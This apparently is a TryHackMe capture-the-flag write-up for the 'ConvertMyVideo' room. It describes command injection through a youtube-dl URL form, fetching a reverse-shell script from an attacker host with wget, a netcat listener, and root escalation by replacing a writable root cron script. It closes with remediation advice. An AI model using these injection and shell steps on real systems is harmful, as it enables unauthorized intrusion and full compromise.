# ConvertMyVideo

**Platform:** TryHackMe
**Category:** Challenge Room
**Difficulty:** Easy
**Status:** ✅ Solved (user flag and root flag captured)

## Background

ConvertMyVideo is a one-feature website — paste a YouTube URL, get a converted video — and that one feature is the vulnerability. Behind the page, the server hands the user's URL to **youtube-dl** on the command line without sanitising it. Any input field that ends up inside a shell command is a command-injection candidate: with the right separators and `${IFS}` spacing tricks, the "URL" can smuggle in extra commands, and the server runs them as the web user. The privilege escalation repeats a pattern from the cron world: **pspy** reveals a cleanup script that root executes on a schedule from a location the web user can write to — replace the script, wait for the schedule, receive a root shell.

## Lab Objective

Exploit the command injection in the video-conversion form to get a shell on the target and the user flag, then abuse the root-scheduled, writable cleanup script for a root shell and the root flag.

**Provided resources:** the target machine only; no credentials are given.

<img width="2771" height="649" alt="step-1" src="https://github.com/user-attachments/assets/9ceafbc8-4ef8-4e53-958a-5c737b02e9f1" />


<img width="3228" height="1679" alt="step-2" src="https://github.com/user-attachments/assets/41804ac9-26c0-40ca-8e2a-8c50c59eec94" />


## Walkthrough

### Step 1: Scan the Target

Run an aggressive Nmap scan:

```bash
nmap -A -Pn 10.48.155.87
```

Two ports are open:

| Port | Service | Detail |
|---|---|---|
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.29 (Ubuntu) |

<img width="2364" height="817" alt="step-3" src="https://github.com/user-attachments/assets/7bfb8874-9a2e-47da-bcb2-e7fbc9ff8515" />


### Step 2: Explore the Site — One Page, One Input

Port 80 serves the converter page: a single form asking for a YouTube URL. Directory busting and general poking around turn up **no other clue** — no panels, no files, no comments. When a site has exactly one input, that input is the attack surface, so study how it behaves.

<img width="2126" height="1086" alt="step-4" src="https://github.com/user-attachments/assets/91ef03c8-be62-4765-b6db-548884727ab2" />


### Step 3: Interrogate the Form in Burp Repeater

Send a normal conversion request, capture it, and send it to **Burp Repeater** to experiment freely. The response is talkative: youtube-dl's own warning text ("assuming restrict file name...") leaks into the output, along with internal path details (`temp downloads` and similar) — information disclosure confirming that the server runs **youtube-dl** against the submitted string and echoes its output back.

<img width="2090" height="907" alt="step-5" src="https://github.com/user-attachments/assets/31e981ba-65e1-432e-8501-9cabe1b1fa84" />


Try a bare command as the "URL", such as `ls`: the application rejects it — "not a valid URL". The input is being passed to youtube-dl, which validates before it fetches. The way through is not to abandon the URL shape but to *extend* it: youtube-dl accepts options (for example `-f` for format selection), so attacker-controlled text after the URL can be interpreted as youtube-dl arguments and shell syntax.

<img width="2833" height="659" alt="step-6" src="https://github.com/user-attachments/assets/44ba7448-d7f2-4bc6-a977-f1499647c0ec" />


### Step 4: Command Injection — Make the Server Run `ls`

Using shell separators and the `${IFS}` trick in place of spaces (which the input handling mangles), commands begin to execute: an injected `ls${IFS}-la` is read and its output comes back in the response. The form is now a command line. From here the plan is the standard one — have the server fetch a shell script from Kali and run it.

<img width="2251" height="1017" alt="step-7" src="https://github.com/user-attachments/assets/4a140494-b597-4003-a703-a6fda725cd4a" />


### Step 5: Download the Shell onto the Target

Serve a reverse-shell script (`shell.sh`) from Kali over HTTP, and inject a `wget` command through the form so the target downloads it:

```text
http://<kali-ip>:8000/shell.sh
```

<img width="2108" height="886" alt="step-8" src="https://github.com/user-attachments/assets/94caeb62-359e-4f66-8ef2-0b163ff1200c" />


The proof is on Kali's side: the HTTP server's log shows the target's request — the file is on the box.

<img width="2215" height="390" alt="step-9" src="https://github.com/user-attachments/assets/44a130b8-2c03-45b2-9252-738561c5265a" />


### Step 6: Make It Executable — `chmod 777`, Not `+x`

The downloaded script needs the executable bit. Inject a chmod through the same channel — using **`chmod 777`** rather than `chmod +x`, because the `+` character causes trouble in the URL encoding of the injected string:

<img width="2246" height="813" alt="step-10" src="https://github.com/user-attachments/assets/df376082-56ef-4893-9f2e-78252d280cba" />


### Step 7: Catch the Shell, Take the User Flag

Set the Netcat listener on Kali:

```bash
nc -nlvp 4444
```

<img width="1749" height="430" alt="step-11" src="https://github.com/user-attachments/assets/85732977-bbd3-44e1-98e1-a3b1b78ed3eb" />





Then inject the command that executes the script:

<img width="2002" height="814" alt="step-12" src="https://github.com/user-attachments/assets/76258ee2-e041-4cd6-9c8b-6e0742b64e46" />





The listener receives the connection — a shell as the web user. The **user flag** is readable from the account's area.

<img width="2235" height="634" alt="step-13" src="https://github.com/user-attachments/assets/1c2d0b18-37b3-4433-8232-1cc2e796d9ec" />


<img width="1864" height="555" alt="step-14" src="https://github.com/user-attachments/assets/571be0ce-9d42-4b9f-ad32-cbdcc3c5dbfb" />


### Step 8: Find Root's Schedule with pspy

For escalation, watch what the machine runs by itself. Upload **pspy64** (the process-monitoring tool that needs no root) through the same file-transfer route used before:

<img width="2186" height="700" alt="step-15" src="https://github.com/user-attachments/assets/60d4c4b8-4072-4d8c-92d0-c979e04fe196" />


Give it execute permission and run it:

```bash
chmod +x pspy64
./pspy64
```

<img width="1572" height="231" alt="step-16" src="https://github.com/user-attachments/assets/e2546287-f583-4e82-aca8-fa17c7ed4b3d" />


<img width="2172" height="840" alt="step-17" src="https://github.com/user-attachments/assets/4788a387-e1df-4dbf-8bf7-ec507b4c1e63" />


pspy's output shows a script being executed **repeatedly, with root permissions** — a scheduled cleanup job.

<img width="2780" height="649" alt="step-18" src="https://github.com/user-attachments/assets/b1f85cdb-146b-467c-b0de-e0d8be6fc1d9" />


### Step 9: Replace the Writable Script

Locate the script pspy named: the file exists in a directory the web user can reach — and, decisively, **write permissions are available** on it. A root cron job running a file that a low-privilege user can replace is a timed root shell.

Delete the original `clean.sh` and upload a new file with the same name in its place — this one containing a reverse-shell payload instead of cleanup commands:

<img width="1732" height="407" alt="step-19" src="https://github.com/user-attachments/assets/05050e0f-ccea-46c1-8c6d-ff1f5d8a1491" />


<img width="2187" height="927" alt="step-20" src="https://github.com/user-attachments/assets/2b028a42-5f78-4cd0-a1a7-e0b15687e1e0" />


### Step 10: Root Shell and the Root Flag

On the next scheduled run, the job executes the replaced script as root, and the listener on Kali receives a **root shell**. Read the root flag from `/root` — room complete.

<img width="2363" height="843" alt="step-21" src="https://github.com/user-attachments/assets/68a6daf9-d04d-475d-beb9-a861b911bfed" />


<img width="1245" height="283" alt="step-22" src="https://github.com/user-attachments/assets/46ba6415-9b00-464b-a5df-2d17bc3314c3" />


## Key Takeaways

- Any user input concatenated into a shell command is command injection until proven otherwise. Here the whole exploit lived in one URL field: youtube-dl's own options plus `${IFS}` and separator tricks turned "convert this video" into arbitrary command execution.
- Error messages are reconnaissance. The application helpfully echoed youtube-dl's warnings and internal paths, identifying the exact backend tool — and a known tool means known abuse patterns.
- Small encodings decide exploits: spaces replaced by `${IFS}`, and `chmod 777` instead of `+x` because the plus sign broke in transit. When a payload "should" work, suspect the transport characters first.
- pspy plus a writable, root-scheduled script is a reliable escalation pair: watch for what root runs, then check whether you can write to it. The schedule does the rest.

## Remediation

Never build shell commands from user input: call tools like youtube-dl through an argument array (no shell), validate URLs against a strict allow-list of hosts and formats, and run the conversion worker as a dedicated low-privilege user in a sandbox with no write access to system paths. Suppress backend tool output and internal paths in user-facing responses. Scheduled root jobs must execute only root-owned scripts from root-owned directories — permissions on every cron target should be audited so no unprivileged account can modify what root will run next.
